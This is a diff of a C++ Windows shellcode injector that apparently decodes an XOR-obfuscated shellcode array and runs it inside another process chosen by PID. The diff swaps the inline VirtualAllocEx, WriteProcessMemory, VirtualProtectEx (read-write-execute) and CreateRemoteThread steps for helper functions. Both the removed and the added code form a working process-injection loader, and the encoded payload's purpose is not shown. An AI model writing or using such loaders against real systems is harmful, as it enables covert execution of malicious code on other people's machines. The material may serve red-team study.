@@ -19,17 +19,15 @@ UCHAR const code[] = "\x8f\x20\xe6\x88\x9c\x8b\xaf\x64\x65\x66\x20\x32\x28\x3c\x
 "\x01\x01\x5d\x0d\x1d\x09\x4c\x4c\x2c\x44\x06\x07\x0d\x00\x47\x09\x1d\x16\x68";
 
 
+// g++ -m64 -o xorRemoteprocess.exe xorRemoteprocess.cpp ../utils/utility.cpp
 int main(int argc, char const *argv[])
 {
-    DWORD   oldProtection;
     DWORD   pid;
-    LPVOID  remoteAddr;
     HANDLE  processHandle;
-    HANDLE  threadHandle;
-    DWORD   lpflOldProtect;
-    SIZE_T  codeSize    = sizeof(code);
-    SIZE_T  keySize     = sizeof(key);
-    SIZE_T  decodedSize = codeSize - 1;
+    LPVOID  remoteAddr  = NULL;
+    DWORD   codeSize    = sizeof(code);
+    DWORD   keySize     = sizeof(key);
+    DWORD   decodedSize = codeSize - 1;
     UCHAR   decoded[decodedSize];
     
     if (argc < 2){
@@ -59,46 +57,10 @@ int main(int argc, char const *argv[])
     }
     MESSAGE(OKAY, "Handle got for process(%ld)\n", pid);
 
-    // Allocate bytes to process memory
-    remoteAddr = VirtualAllocEx(processHandle, NULL, decodedSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
-    if (remoteAddr == NULL){
-        MESSAGE(FAIL, "Impossible to allocate %ld bytes of memory in process(%ld)\n", decodedSize, pid);
-        PRINT_ERROR(VirtualAllocEx);
-        return EXIT_FAILURE;
-    }
-    MESSAGE(OKAY, "%ld bytes of memory successfully allocate in process(%ld)\n", decodedSize, pid);
+    allocateAndCopyRemote(processHandle, (LPCVOID)decoded, decodedSize, &remoteAddr);
 
-    // Write bytes(shellcode) to process allocated memory
-    if (WriteProcessMemory(processHandle, remoteAddr, (LPCVOID)decoded, decodedSize, NULL) == 0){
-        MESSAGE(FAIL, "Impossible to write shellcode to process(%ld)\n", pid);
-        PRINT_ERROR(WriteProcessMemory);
-        return EXIT_FAILURE;
-    }
-    MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory of process(%ld)\n", decodedSize, pid);
+    allowAndExecuteRemote(processHandle, remoteAddr, decodedSize);
 
-    // Change the proetction of allocated memory to EXECUTE and READ
-    if (VirtualProtectEx(processHandle, remoteAddr, decodedSize, PAGE_EXECUTE_READWRITE, &lpflOldProtect) == 0){
-        MESSAGE(FAIL, "Impossible to change the protection of the allocated space in process(%ld)\n", pid);
-        PRINT_ERROR(WriteProcessMemory);
-        return EXIT_FAILURE;
-    }
-    MESSAGE(OKAY, "Permission successfully changed to ERW at 0x%p\n", pid, remoteAddr);
-
-    MESSAGE(INFO, "Press <enter> to run the code...\n");
-    getchar();
-    // Create thread to run the code remotly
-    threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
-    if ( threadHandle == NULL){
-        MESSAGE(FAIL, "Impossible to create thread in process(0x%p): Error %ld\n", processHandle, GetLastError());
-        return EXIT_FAILURE;
-    }
-    MESSAGE(OKAY, "Successfully create thread to run the code in process(%ld)\n", pid);
-
-    MESSAGE(OKAY, "Waiting for thread to finish executing...\n");
-    WaitForSingleObject(threadHandle, INFINITE);
-    
-    MESSAGE(OKAY,"Thread finished executing, cleaning up\n");
-    CloseHandle(threadHandle);
     CloseHandle(processHandle);
 
     return EXIT_SUCCESS;
